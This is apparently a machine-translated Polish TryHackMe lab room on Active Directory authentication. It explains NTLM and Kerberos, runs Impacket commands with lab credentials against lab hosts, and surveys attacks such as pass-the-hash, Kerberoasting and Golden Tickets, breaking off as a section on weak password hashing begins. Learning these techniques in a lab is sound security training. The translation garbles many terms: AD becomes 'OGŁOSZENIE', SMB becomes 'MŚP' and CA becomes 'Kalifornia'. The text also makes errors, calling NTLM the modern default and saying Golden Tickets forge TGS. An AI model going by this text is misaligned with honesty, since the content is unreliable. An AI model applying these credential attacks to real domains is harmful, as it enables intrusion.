---

Gdy po raz pierwszy uzyskasz dostęp do usługi Active Directory (OGŁOSZENIE) jedną z najważniejszych rzeczy do zrozumienia jest sposób działania uwierzytelniania. Uwierzytelnianie to proces, w którym użytkownicy i komputery potwierdzają swoją tożsamość przed uzyskaniem dostępu do zasobów sieciowych. Bez dogłębnego zrozumienia, jak to działa, trudno jest zidentyfikować słabe punkty lub zaplanować skuteczną ścieżkę ataku.

W tej sali przyjrzymy się, jak działa uwierzytelnianie w środowiskach AD. Poznasz dwa główne protokoły uwierzytelniania używane w domenach Windows, a mianowicie: NTLM I Kerberosi zdobądź praktyczne doświadczenie w identyfikowaniu protokołu używanego podczas sesji na żywo. Ta podstawowa wiedza jest niezbędna przed przejściem do bardziej zaawansowanych tematów, takich jak zbieranie danych uwierzytelniających, ataki retransmisyjne i wykorzystywanie biletów, omawiane w kolejnych salach.

## Cele edukacyjne

W tym pokoju dowiesz się:

- Co oznacza uwierzytelnianie w środowisku Active Directory
- Różnica między uwierzytelnianiem a autoryzacją
- Jak działa uwierzytelnianie NTLM i Kerberos na wysokim poziomie
- Jak zidentyfikować protokół uwierzytelniania użyty podczas logowania
- Typowe słabości uwierzytelniania usługi AD, które mogą wykorzystać atakujący

## Wymagania wstępne

Zanim rozpoczniesz pracę w tym pokoju, powinieneś zapoznać się z następującymi informacjami:

- Podstawowa znajomość systemów operacyjnych Windows
- Umiejętność korzystania z narzędzi wiersza poleceń wPowerShelllub CMD
- Koncepcje omówione w [podstawach usługi Active Directory](https://tryhackme.com/room/winadbasics)
- Koncepcje omówione w [Podstawach systemu Windows](https://tryhackme.com/module/windows-fundamentals)

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

**AttackBox**

Jeśli korzystasz z internetowego AttackBoxa, połączenie z siecią zostanie nawiązane automatycznie po uruchomieniu AttackBoxa ze strony pokoju. Możesz to sprawdzić, uruchamiając polecenie `ping`dla adresu IP hosta `ROOTDC.THM.LOC`. Powinieneś również poświęcić chwilę na zanotowanie swojego  adresu IP.VPN IP. Używając  `ifconfig` lub  `ip a`, zanotuj adres IP  `tun0` karty sieciowej. To Twój adres IP i powiązany interfejs, którego powinieneś używać podczas wykonywania ataków w zadaniach.

**Inni gospodarze**

Jeśli zamierzasz użyć własnej maszyny atakującej, plik konfiguracyjny OpenVPN zostanie dla Ciebie wygenerowany po dołączeniu do pokoju. Kliknij  przycisk **„Pobierz profil VPN”** w Panelu sterowania siecią:  
  
![Schemat sieci przedstawiający dwa hosty Windows: ROOTDC.THM.LOC (192.168.11.100) połączony z SERVER1 (192.168.11.51).](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1777667864006.png)

Użyj klienta OpenVPN, aby się połączyć. Ten przykład pokazano na  komputerze [z systemem Linux](https://tryhackme.com/access)  . Skorzystaj z tego przewodnika, aby połączyć się w systemie  [Windows](https://tryhackme.com/access)  lub  [macOS](https://tryhackme.com/access) .

OpenVPN

```bash
user@tryhackme:$ sudo openvpn ad-auth.ovpn
2026-05-01 15:30:18 OpenVPN 2.6.14 aarch64-apple-darwin24.2.0 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [MH/RECVDA] [AEAD]
2026-05-01 15:30:18 library versions: OpenSSL 3.6.1 27 Jan 2026, LZO 2.10
[....]
2026-05-01 15:30:20 /sbin/ifconfig utun4 192.168.21.2 192.168.21.2 netmask 255.255.255.0 mtu 1500 up
2026-05-01 15:30:20 /sbin/route add -net 192.168.21.0 192.168.21.2 255.255.255.0
add net 192.168.21.0: gateway 192.168.21.2
2026-05-01 15:30:20 /sbin/route add -net 192.168.11.0 192.168.21.1 255.255.255.0
add net 192.168.11.0: gateway 192.168.21.1
2026-05-01 15:30:20 Initialization Sequence Completed
```

Komunikat „Sekwencja inicjalizacji ukończona” informuje, że nawiązano połączenie z siecią.

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na  [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)lub przez e-mail na adres `support@tryhackme.com`.

Zanim zagłębimy się w narzędzia i techniki, ważne jest zrozumienie, co tak naprawdę oznacza uwierzytelnianie w kontekścieOGŁOSZENIEUwierzytelnianie to proces potwierdzania tożsamości, który w istocie odpowiada na pytanie:  _„Czy jesteś tym, za kogo się podajesz?”_

## Materiał uwierzytelniający

Podczas uwierzytelniania podajesz jakąś formę danych uwierzytelniających, która potwierdza Twoją tożsamość. W środowiskach Active Directory jest to najczęściej kombinacja nazwy użytkownika i hasła. Materiał uwierzytelniający może jednak przybierać również inne formy:

- **Nazwa użytkownika i hasło:** Najbardziej powszechna metoda, w której podajesz coś, co wiesz.
- **Certyfikaty:** Certyfikat kryptograficzny wydany przez zaufany Urząd Certyfikacji (Kalifornia) może potwierdzić tożsamość. Jest to często wykorzystywane do uwierzytelniania maszynowego lub logowania za pomocą karty inteligentnej.
- **Hasze:** Choć nie są przeznaczone do bezpośredniego użytku, hasze haseł można używać do uwierzytelniania w niektórych atakach (więcej na ten temat w dalszej części).

Bez względu na metodę, cel pozostaje ten sam: udowodnić domenie, że jesteś tym, za kogo się podajesz.

## Uwierzytelnianie a autoryzacja

Częstym problemem jest różnica między uwierzytelnianiem a autoryzacją. Są to dwa odrębne procesy:

- **Uwierzytelnianie:** Potwierdza twoją tożsamość -  _„Jesteś Johnem”._
- **Autoryzacja:** Określa, co masz prawo robić - _„John ma dostęp do udziału finansowego”._

Uwierzytelnianie zawsze jest na pierwszym miejscu. Domena musi najpierw zweryfikować Twoją tożsamość, zanim będzie mogła określić, do jakich zasobów masz dostęp. Gdy logujesz się na komputerze przyłączonym do domeny, proces uwierzytelniania weryfikuje Twoje dane uwierzytelniające. Po uwierzytelnieniu, kontrole autoryzacji (takie jak członkostwo w grupach i listy kontroli dostępu) określają, co faktycznie możesz robić w sieci.

## Protokoły uwierzytelniania AD

Jeśli chodzi o uwierzytelnianie w usłudze Active Directory, istnieją dwa główne protokoły, które obsługują weryfikację tożsamości:

- **NetNTLM (powszechnie nazywanyNTLM)** : Protokół uwierzytelniania typu wyzwanie-odpowiedź, który był stosowany od początków systemu Windows NT.
- **Kerberos**:Protokół uwierzytelniania oparty na biletach, który stał się domyślnym rozwiązaniem w systemie Windows 2000 i do dziś pozostaje preferowaną metodą.

Chociaż system Windows obsługuje inne mechanizmy uwierzytelniania, takie jak uwierzytelnianie oparte na certyfikatach,TLS/SSL do logowania za pomocą karty inteligentnej, ostatecznie i tak skutkuje wydaniem biletu Kerberos w celu dalszego uwierzytelnienia zasobów domeny. Certyfikat potwierdza tożsamość użytkownika, ale Kerberos zajmuje się później faktycznym uwierzytelnieniem sesji.

Możesz również spotkać się z protokołami takimi jak:LDAP, WebDAV lubMŚPpodczas pracy w środowiskach AD. Są to jednak protokoły dostępu do usług lub katalogów. Do przeprowadzenia faktycznego uwierzytelniania wykorzystują one protokół NTLM lub Kerberos. Na przykład, gdy uwierzytelniasz się w usłudze LDAP lub uzyskujesz dostęp do udziału plików SMB, uwierzytelnianie bazowe jest obsługiwane przez protokół NTLM lub Kerberos.

Zrozumienie tych dwóch podstawowych protokołów jest kluczowe, ponieważ niemal każdy atak oparty na usługach Active Directory (AD), z jakim się spotkasz, wykorzystuje słabości w sposobie uwierzytelniania NTLM lub Kerberos. W kolejnych dwóch zadaniach przyjrzymy się bliżej każdemu protokołowi i jego działaniu.

Teraz, gdy rozumiemy, czym jest uwierzytelnianie, przyjrzyjmy się bliżej pierwszemu z dwóch podstawowych OGŁOSZENIE protokoły uwierzytelniania: NTLM.

## Czym jest NTLM?

NetNTLM (często nazywany po prostu NTLM) to protokół uwierzytelniania typu wyzwanie-odpowiedź, który był obecny od początków systemu Windows NT. Chociaż został w dużej mierze zastąpiony przez Kerberos NTLM jest domyślnym protokołem uwierzytelniania w nowoczesnych środowiskach Windows i nadal jest szeroko stosowany — szczególnie w starszych systemach, środowiskach grup roboczych oraz jako rozwiązanie awaryjne, gdy protokół Kerberos jest niedostępny.

NTLM występuje w kilku wersjach:

- **NTLMv1:** Wersja oryginalna, obecnie uważana za wysoce niebezpieczną.
- **NTLMv2:** Udoskonalona wersja z silniejszą kryptografią, choć nadal podatna na różne ataki.

## Jak działa uwierzytelnianie NTLM

Kluczową cechą NTLM jest to, że **klient uwierzytelnia się w usłudze, do której chce uzyskać dostęp** , a usługa ta następnie weryfikuje tożsamość użytkownika w kontrolerze domeny. Różni się to od Kerberos, gdzie najpierw uwierzytelnia się w kontrolerze domeny i otrzymuje bilet do przedstawienia usługom.

![Autoryzacja NetNTLM](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png)

Proces uwierzytelniania NTLM przebiega następująco:

1. Klient wysyła żądanie dostępu do usługi podając swoją nazwę użytkownika.
2. Serwer generuje losową 16-bajtową liczbę zwaną **wyzwaniem** (lub nonce) i wysyła ją do klienta.
3. Klient szyfruje to wyzwanie, korzystając z **skrótu NT** swojego hasła i odsyła odpowiedź do serwera.
4. Serwer przesyła nazwę użytkownika, oryginalne wyzwanie i odpowiedź klienta do kontrolera domeny.
5. Kontroler domeny pobiera skrót NT użytkownika ze swojej bazy danych i używa go do zaszyfrowania tego samego wyzwania.
6. Kontroler domeny porównuje swój wynik z odpowiedzią wysłaną przez klienta. Jeśli są one zgodne, uwierzytelnianie kończy się powodzeniem.
7. Serwer odbiera wynik od kontrolera domeny i odpowiednio udziela lub odmawia dostępu.

Należy zauważyć, że rzeczywiste hasło użytkownika nigdy nie jest wysyłane przez sieć, a jedynie zaszyfrowana odpowiedź na wyzwanie. Czasami nazywa się to  **dowodem zerowej wiedzy** , ponieważ użytkownik udowadnia, że ​​zna hasło, nie ujawniając go bezpośrednio.

## Korzyści z NTLM

Pomimo swojego wieku, NTLM ma pewne zalety, które wyjaśniają, dlaczego nadal jest w użyciu:

- **Prostota** : NTLM jest stosunkowo łatwy do wdrożenia i nie wymaga dodatkowej infrastruktury, takiej jak centrum dystrybucji kluczy (KDC).
- **Brak konieczności synchronizacji czasu** : W przeciwieństwie do Kerberosu, NTLM nie wymaga synchronizacji zegarów między systemami, co ułatwia jego wdrożenie w niektórych środowiskach.
- **Zgodność w trybie awaryjnym** : NTLM służy jako niezawodna wersja awaryjna w przypadku niepowodzenia uwierzytelniania Kerberos, zapewniając użytkownikom możliwość ponownego uwierzytelnienia.
- **Obsługa grup roboczych** : NTLM można stosować w środowiskach niedomenowych (grupach roboczych), w których protokół Kerberos nie jest dostępny.

## Wady NTLM

Jednakże protokół NTLM ma poważne luki w zabezpieczeniach, które czynią go celem atakujących:

- **Brak wzajemnego uwierzytelniania** : Klient nie może zweryfikować tożsamości serwera, co czyni go podatnym na ataki typu man-in-the-middle.
- **Słaba kryptografia** : NTLMv1 wykorzystuje DES Szyfrowanie i niezasolone skróty, które można szybko złamać za pomocą nowoczesnego sprzętu. Nawet NTLMv2, choć silniejszy, przechowuje niezasolone skróty w pamięci.
- **Podatność na ataki retransmisyjne** : atakujący może przechwycić i retransmitować uwierzytelnianie NTLM, aby uzyskać nieautoryzowany dostęp do innych usług.
- **Ataki typu „pass-the-hash”** : Ponieważ skrót NT jest używany bezpośrednio w procesie uwierzytelniania, atakujący mający dostęp do skrótu może przeprowadzić uwierzytelnienie, nie znając faktycznego hasła.
- **Wolniejsza wydajność** : Każde żądanie uwierzytelnienia wymaga komunikacji z kontrolerem domeny, co może spowalniać uwierzytelnianie w dużych środowiskach.

## Kiedy stosuje się NTLM?

Nawet w nowoczesnych środowiskach AD, w których Kerberos jest protokołem domyślnym, protokół NTLM będzie używany w następujących scenariuszach:

- Gdy klient nie może nawiązać połączenia z kontrolerem domeny w celu uzyskania biletu Kerberos.
- Podczas uzyskiwania dostępu do zasobu za pomocą adresu IP zamiast nazwy hosta (Kerberos wymaga nazwy głównej usługi, która opiera się naDNS(imiona i nazwiska).
- Jeśli usługa docelowa nie ma zarejestrowanej nazwy głównej usługi (SPN) w usłudze Active Directory.
- Podczas uwierzytelniania w systemach, które nie są przyłączone do domeny.
- Gdy starsze aplikacje wymagają protokołu NTLM.

## Uwierzytelnianie NTLM z Impacket

Zobaczmy uwierzytelnianie NTLM w akcji. Użyjemy narzędzia Impacket do uwierzytelnienia na komputerze docelowym za pomocą danych uwierzytelniających. Impacket to zbiór skryptów Pythona, które implementują różne protokoły sieciowe, w tym te używane w środowiskach Active Directory. Zestaw narzędzi Impacket jest dostępny w katalogu AttackBox `/opt/impacket/examples/`.

Z poziomu AttackBox użyj  `smbclient.py`Impacket, aby nawiązać połączenie z udostępnionym zasobem na urządzeniu docelowym, korzystając z uwierzytelniania NTLM:

Smbclient.py

```bash
root@tryhackme:~$ smbclient.py thm.loc/claire:'Password123!'@192.168.11.51
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
# 
```

Po połączeniu możesz wyświetlić listę udziałów za pomocą  `shares`polecenia. Następnie połącz się za `SHARE1`pomocą `use SHARE1`polecenia. Uzyskasz wtedy dostęp do flagi.

Za kulisami wydarzyło się co następuje:

1. Twój klient wysłał Twoją nazwę użytkownika do celu.
2. Cel odpowiedział wyzwaniem.
3. Twój klient zaszyfrował wyzwanie, korzystając z skrótu NT Twojego hasła, i wysłał odpowiedź.
4. Obiekt docelowy przesłał Twoje dane uwierzytelniające do kontrolera domeny w celu weryfikacji.
5. Po pomyślnej weryfikacji uzyskałeś dostęp.

Właśnie wykonałeś uwierzytelnianie NTLM!

Teraz przyjrzyjmy sięKerberos, domyślny protokół uwierzytelniania w nowoczesnychOGŁOSZENIEśrodowiskach. W przeciwieństwie doNTLMKerberos wykorzystuje system oparty na biletach i uwierzytelnia za pośrednictwem zaufanej strony trzeciej: Centrum Dystrybucji Kluczy (KDC).

## Czym jest Kerberos?

Kerberos to protokół uwierzytelniania sieciowego opracowany przez MIT i przyjęty przez firmę Microsoft jako domyślna metoda uwierzytelniania począwszy od systemu Windows 2000. Nazwa protokołu pochodzi od Cerbera, trójgłowego psa z mitologii greckiej, który strzeże bram podziemi. Jest to trafna nazwa protokołu mającego na celu ochronę dostępu do zasobów sieciowych.

Istotną różnicą między Kerberosem a NTLM jest **miejsce, w którym następuje uwierzytelnianie** . W przypadku NTLM uwierzytelniasz się w usłudze, do której chcesz uzyskać dostęp, a ona następnie weryfikuje Twoją tożsamość u kontrolera domeny. W przypadku Kerberosu proces ten jest odwrócony: najpierw uwierzytelniasz się w kontrolerze domeny i otrzymujesz bilety, które następnie przedstawiasz usługom w celu potwierdzenia swojej tożsamości.

## Kluczowe komponenty Kerberos

Zanim przejdziemy do procesu uwierzytelniania, zdefiniujmy kluczowe komponenty:

|   |   |
|---|---|
|Część|Opis|
|Centrum Dystrybucji Kluczy (KDC)|Usługa działająca na kontrolerze domeny, która obsługuje wszystkie żądania biletów. Składa się z usługi uwierzytelniania (AS) i usługi przyznawania biletów (Ticket Granting Service).TGS).|
|Usługa uwierzytelniania (AS)|Komponent KDC weryfikujący tożsamość użytkownika i wystawiający początkowy bilet przyznający bilet (TGT).|
|Usługa przyznawania biletów (TGS)|Komponent KDC wystawiający bilety serwisowe użytkownikom, którzy przedstawią ważny bilet TGT.|
|Bilet uprawniający do otrzymania biletu (TGT)|Początkowy „bilet podstawowy” wydawany po pomyślnym uwierzytelnieniu. Ten bilet służy do żądania dostępu do określonych usług.|
|Bilet serwisowy (ST)|Bilet uprawniający do dostępu do określonej usługi. Otrzymuje się go po okazaniu TGT w TGS.|
|Nazwa główna usługi (SPN)|Unikalny identyfikator instancji usługi, używany przez protokół Kerberos do skojarzenia usługi z konkretnym kontem.|
|Konto KRBTGT|Specjalne konto w AD, którego hash hasła służy do szyfrowania wszystkich biletów TGT. Włamanie się na to konto umożliwia podrabianie Złotych Biletów.|

## Jak działa uwierzytelnianie Kerberos

Proces uwierzytelniania Kerberos obejmuje wielokrotną wymianę danych między klientem, KDC i usługą docelową. Łącznie składa się z 5 kroków i 8 procesów, szczegółowo opisanych poniżej:

**Krok 1: Żądanie usługi uwierzytelniania (AS-REQ)**

1. Użytkownik wprowadza swoje dane uwierzytelniające na komputerze klienckim.

2. Klient wysyła do KDC żądanie usługi uwierzytelniania (AS-REQ), zawierające nazwę użytkownika i znacznik czasu zaszyfrowane skrótem hasła użytkownika (nazywa się to wstępnym uwierzytelnianiem).

**Krok 2: Odpowiedź usługi uwierzytelniania (AS-REP)**

3. KDC weryfikuje tożsamość użytkownika poprzez odszyfrowanie znacznika czasu przy użyciu skrótu hasła użytkownika zapisanego w usłudze AD.

4. W przypadku powodzenia KDC odpowiada komunikatem AS-REP zawierającym:

- Klucz **sesji** zaszyfrowany hasłem użytkownika.
- **Bilet TGT** zaszyfrowany   hasłem konta KRBTGT.

Klient może odszyfrować klucz sesji, ale nie może odszyfrować ani zmodyfikować TGT; może to zrobić tylko KDC. Te dwa pierwsze kroki przedstawiono na poniższym diagramie:

![Kerberos Krok 1 i 2](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png)

**Krok 3: Żądanie usługi przyznawania biletów (TGS-REQ)**

5. Gdy użytkownik chce uzyskać dostęp do usługi, klient wysyła do KDC komunikat TGS-REQ zawierający:

- TGT otrzymano wcześniej.
- Nazwa SPN usługi, do której chcą uzyskać dostęp.
- Element uwierzytelniający (nazwa użytkownika i znacznik czasu) zaszyfrowany kluczem sesji.

**Krok 4: Odpowiedź usługi przyznawania biletów (TGS-REP)**

6. KDC odszyfrowuje TGT przy użyciu skrótu KRBTGT, weryfikuje żądanie i odpowiada:

- Bilet **serwisowy (ST)** zaszyfrowany skrótem hasła usługi docelowej.
- Klucz **sesji usługi** zaszyfrowany przy użyciu oryginalnego klucza sesji.

Kroki 3 i 4 pokazano na poniższym schemacie:

![Kerberos Krok 3 i 4](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png)

**Krok 5: Wniosek o aplikację (AP-REQ)**

7. Klient przedstawia Bilet Serwisowy docelowemu serwisowi.

8. Usługa odszyfrowuje bilet przy użyciu własnego skrótu hasła, weryfikuje tożsamość użytkownika i udziela dostępu.

Ostatni krok pokazano na poniższym schemacie:

![Kerberos Krok 5](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png)

## Korzyści z Kerberos

Kerberos oferuje znaczące zalety w porównaniu z NTLM:

- **Wzajemne uwierzytelnianie:** zarówno klient, jak i serwer weryfikują wzajemnie swoją tożsamość, chroniąc w ten sposób przed atakami typu man-in-the-middle.
- **Brak przesyłania haseł:** Hasła i skróty nie są nigdy przesyłane przez sieć; przesyłane są wyłącznie zaszyfrowane bilety i klucze sesji.
- **Jednokrotne logowanie (SSO):** Po uzyskaniu biletu TGT użytkownik może korzystać z wielu usług bez konieczności ponownego wprowadzania danych logowania.
- **Obsługa delegowania:** Kerberos obsługuje delegowanie, umożliwiając usługom działanie w imieniu użytkowników w celu uzyskania dostępu do innych zasobów.
- **Lepsza wydajność:** KDC jest nawiązywane tylko podczas początkowego uwierzytelniania i żądania nowych biletów serwisowych. Usługi weryfikują bilety lokalnie, bez kontaktu zDCdla każdego żądania.
- **Bilety o ograniczonym czasie ważności:** Bilety mają konfigurowalny okres ważności (zwykle 10 godzin w przypadku biletów TGT), co ogranicza okno możliwości ataku.

## Wady Kerberosa

Mimo udoskonaleń Kerberos ma również swoje słabości:

- **Wymagana synchronizacja czasu:** Kerberos wymaga synchronizacji zegarów w ciągu 5 minut. Duże różnice czasu powodują błędy uwierzytelniania.
- **Pojedynczy punkt awarii:** KDC ma krytyczne znaczenie, jeśli jest niedostępny, uwierzytelnianie Kerberos kończy się całkowitym niepowodzeniem (choć NTLM można zastosować jako rozwiązanie awaryjne).
- **Podatność na ataki biletowe:** Skradzione bilety mogą być wykorzystywane do podszywania się pod użytkowników (Pass-the-Ticket). Zhakowany hash KRBTGT umożliwia podrabianie Złotych Biletów.
- **Kerberoasting:** Bilety serwisowe są szyfrowane za pomocą haszy haseł do kont serwisowych, które może uzyskać każdy uwierzytelniony użytkownik i złamać w trybie offline. Złożoność: Kerberos wymaga prawidłowej rejestracji SPN.DNSkonfiguracji i synchronizacji czasu, co utrudnia wdrażanie i rozwiązywanie problemów.

## Pliki pamięci podręcznej poświadczeń (ccache)

NALinuxW systemach Kerberos przechowuje bilety w plikach pamięci podręcznej uprawnień, powszechnie nazywanych **plikami ccache** . Pliki te przechowują bilety TGT użytkownika oraz wszelkie bilety serwisowe uzyskane przez niego podczas sesji.

Najważniejsze informacje o plikach ccache:

- Domyślna lokalizacja: `/tmp/krb5cc_%{uid}`(np. `/tmp/krb5cc_1000`dla UID 1000)
- Zmienna `KRB5CCNAME`środowiskowa określa, którego pliku ccache użyć.
- Polecenie `klist`wyświetla bilety zapisane w bieżącym ccache.
- Narzędzia takie jak Impacket wykorzystują pliki ccache do uwierzytelniania bez konieczności podawania hasła.

Jest to istotne dla atakujących, ponieważ jeśli uda im się uzyskać plik ccache użytkownika, mogą uwierzytelnić się jako ten użytkownik, nie znając jego hasła. Taki atak jest znany jako **Pass-the-Ticket** lub **Pass-the-ccache** .

## Uwierzytelnianie Kerberos z Impacket

Zobaczmy uwierzytelnianie Kerberos w działaniu z wykorzystaniem Impacket. Najpierw uzyskamy bilet TGT i zapiszemy go w pliku ccache, a następnie użyjemy tego biletu do uwierzytelnienia w usłudze. Ponieważ Kerberos działa przez DNS, pierwszym krokiem jest zakodowanie na stałe nazwy hosta SERVER1:

Dodaj SERVER1 do /etc/hosts

```bash
root@tryhackme:~$ echo 192.168.11.51 SERVER1.thm.loc >> /etc/hosts
```

Używając tego samego terminala, co w poprzednim zadaniu, skorzystamy `getTGT.py`z Impacket, aby poprosić o TGT:

pobierzTGT.py

```bash
root@tryhackme:~$ getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Saving ticket in mary.ccache
```

Spowoduje to utworzenie pliku ccache o nazwie znajdującej się `mary.ccache`w bieżącym katalogu. 

Teraz, aby użyć tego biletu do uwierzytelnienia, musimy ustawić `KRB5CCNAME`zmienną środowiskową tak, aby wskazywała na nasz plik ccache:

KRB5CCNAME

```bash
root@tryhackme:$ export KRB5CCNAME=mary.ccache
```

Po ustawieniu zmiennej środowiskowej możemy teraz używać uwierzytelniania Kerberos z innymi narzędziami Impacket. Połączmy się z udziałem SMB, używając `smbclient.py`uwierzytelniania Kerberos:

smbclient.py

```bash
root@tryhackme:$ smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

Flaga `-k`informuje narzędzie o korzystaniu z uwierzytelniania Kerberos i `-no-pass`wskazuje, że uwierzytelniamy się za pomocą biletu, a nie hasła. Ponieważ narzędzie zażąda TGS od kontrolera domeny, ale DNS nie działa, używamy flagi -dc-ip, aby wskazać mu lokalizację KDC.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Podczas korzystania z protokołu Kerberos należy używać nazwy **hosta** (a nie adresu IP), ponieważ protokół Kerberos opiera się na nazwach SPN, które są powiązane z nazwami DNS.

Za kulisami wydarzyło się co następuje:

1. Twój klient użył TGT z pliku ccache, aby poprosić o bilet serwisowy w KDC.
2. KDC wydało Bilet serwisowy dlaMŚPpraca.
3. Twój klient przedstawił bilet serwisowy hostowi docelowemu.
4. Docelowy host zweryfikował bilet i przyznał dostęp.

Właśnie wykonałeś uwierzytelnianie Kerberos!

Teraz, gdy rozumiesz jakNTLMIKerberosW kontekście uwierzytelniania ważne jest zrozumienie, dlaczego ta wiedza jest istotna z punktu widzenia bezpieczeństwa. Oba protokoły, choć funkcjonalne, mają istotne słabości, które atakujący mogą wykorzystać do uzyskania nieautoryzowanego dostępu do systemów i danych. Pomimo dekad istnienia, luki te wciąż są powszechne we współczesnych systemach.OGŁOSZENIEśrodowiskach i są aktywnie wykorzystywane w atakach w świecie rzeczywistym.

## Typowe słabości uwierzytelniania w usłudze AD

Uwierzytelnianie w usłudze Active Directory (AD) jest obarczone licznymi słabościami wynikającymi zarówno z ograniczeń projektowych protokołu, jak i typowych błędów konfiguracji. Zrozumienie tych luk jest kluczowe zarówno dla specjalistów ds. bezpieczeństwa ofensywnego, jak i obrońców. Do najczęściej wykorzystywanych słabości uwierzytelniania należą:

**Słabości specyficzne dla NTLM:**

- **Słaba kryptografia** : NTLM korzysta ze przestarzałego algorytmu skrótu MD4 bez soli, przez co skróty haseł są podatne na ataki typu rainbow table i szybkie łamanie metodą brute force przy użyciu nowoczesnego sprzętu GPU.
- **Pass-the-Hash (PtH)** : Ponieważ NTLM używa skrótu hasła bezpośrednio w mechanizmie wyzwania-odpowiedzi, atakujący, który uzyska skrót NTLM użytkownika, może uwierzytelnić się, nie znając hasła w postaci zwykłego tekstu.
- **Ataki przekaźnikowe NTLM** : Brak wzajemnego uwierzytelniania pozwala atakującym przechwytywać i przekazywać próby uwierzytelniania NTLM do innych usług, uzyskując w ten sposób nieautoryzowany dostęp bez konieczności łamania żadnych danych uwierzytelniających.
- **Ataki obniżające wersję** : atakujący mogą zmusić systemy do przejścia z protokołu Kerberos na słabszy protokół NTLM, narażając je na ataki specyficzne dla protokołu NTLM.
- **Brak wzajemnego uwierzytelniania** : Protokół NTLM nie może zweryfikować tożsamości serwera, co znacznie ułatwia przeprowadzanie ataków typu man-in-the-middle.

**Słabości specyficzne dla Kerberosa:**

- **Kerberoasting** : Każdy uwierzytelniony użytkownik domeny może zażądać biletów serwisowych dla kont z zarejestrowanymi nazwami SPN. Bilety te są szyfrowane hashem hasła konta usługi i można je złamać offline, często ujawniając słabe hasła do kont usług.
- **AS-REP Roasting** : Użytkownicy z wyłączonym wstępnym uwierzytelnianiem Kerberos mogą wyodrębnić skróty swoich haseł i je złamać w trybie offline bez konieczności wcześniejszego uwierzytelnienia w domenie.
- **Pass-the-Ticket (PtT)** : Ważne bilety Kerberos można wyodrębnić z pamięci i ponownie wykorzystać do uwierzytelnienia się jako właściciel biletu, nawet jeśli nie znasz swojego hasła.
- **Overpass-the-Hash** : atakujący, który ma skrót NTLM użytkownika, może zażądać protokołu KerberosTGTw imieniu użytkownika, skutecznie konwertując skrót NTLM na bilet Kerberos.
- **Ataki typu Golden Ticket** : Jeśli atakujący uzyska skrót hasła konta KRBTGT, może je sfałszowaćTGSdla każdego użytkownika w domenie, w tym administratorów domeny, zapewniając pełną i trwałą kontrolę nad domeną.
- **Ataki na srebrne bilety** : podobne do złotych biletów, ale podrabiane przy użyciu skrótu hasła konta usługi w celu tworzenia biletów usług dla określonych zasobów bez kontaktowania się zKDC.

**Słabości oparte na konfiguracji:**

- **Słabe hasła** : Mimo środków kontroli technicznej, słabe hasła użytkowników i kont usług pozostają najczęstszym punktem wejścia dla ataków uwierzytelniających.
- **Rozpylanie haseł** : atakujący próbują uwierzytelniać konta za pomocą powszechnie używanych haseł, często skutecznie je naruszając, nie uruchamiając zasad blokady konta.
- **Nieprawidłowo skonfigurowane delegowanie** : Nieprawidłowa konfiguracja ograniczonego lub nieograniczonego delegowania Kerberos może umożliwić eskalację uprawnień i przemieszczanie się poziome.
- **Nieaktualne dane uwierzytelniające** : Stare konta usługowe, konta byłych pracowników i nieużywane konta komputerowe często mają słabe lub niezmienione hasła, stając się łatwym celem ataków.

Te luki nie są teoretyczne i są aktywnie wykorzystywane w praktyce. Według najnowszych danych wywiadowczych dotyczących zagrożeń, ataki oparte na poświadczeniach stanowią większość udanych ataków na usługi Active Directory. Microsoft ogłosił nawet plany całkowitego wycofania protokołu NTLM w przyszłych wersjach systemu Windows ze względu na jego wrodzone słabości w zakresie bezpieczeństwa, choć przejście na tę technologię zajmie lata.

## Pokazy praktyczne

W tym zadaniu zdobędziesz praktyczne doświadczenie w wykorzystaniu czterech z tych słabych punktów uwierzytelniania. W każdym ataku uwierzytelnisz się w udziale plików używanym w dwóch poprzednich zadaniach (SERVER1).thm.loc:192.168.11.51) z użyciem różnych skompromitowanych danych uwierzytelniających w celu pobrania flagi. To zadanie służy jako wstęp, każda technika zostanie omówiona znacznie bardziej szczegółowo w dedykowanych salach w dalszej części tego modułu.

Cztery ataki, które zademonstrujemy to:

1. **Hashowanie słabych haseł** : łamanie haseł NTLM w celu odzyskiwania haseł w postaci zwykłego tekstu
2. **Pass-the-Hash** : uwierzytelnianie wyłącznie za pomocą skrótu, bez konieczności podawania hasła w postaci zwykłego tekstu
3. **Kerberoasting** : wyodrębnianie i łamanie danych uwierzytelniających konta usługi
4. **Złoty bilet** : podrabianie biletów Kerberos w celu podszywania się pod dowolnego użytkownika

Zacznijmy od słabego hashowania haseł.

## Słabe hashowanie hasła

Jedną z najbardziej fundamentalnych słabości uwierzytelniania w usłudze Active Directory (AD) jest stosowanie słabego hashowania haseł. Hasła przechowywane w usłudze Active Directory są hashowane za pomocą algorytmu haszującego NTLM. Chociaż uniemożliwia to przechowywanie haseł w postaci zwykłego tekstu, hasze NTLM mają poważną wadę: są obliczane bez dodatku soli. Oznacza to, że identyczne hasła zawsze generują identyczne hasze, co czyni je podatnymi na ataki z wykorzystaniem wstępnie obliczonych haszy (tablice tęczowe) i łamanie metodą brute-force.

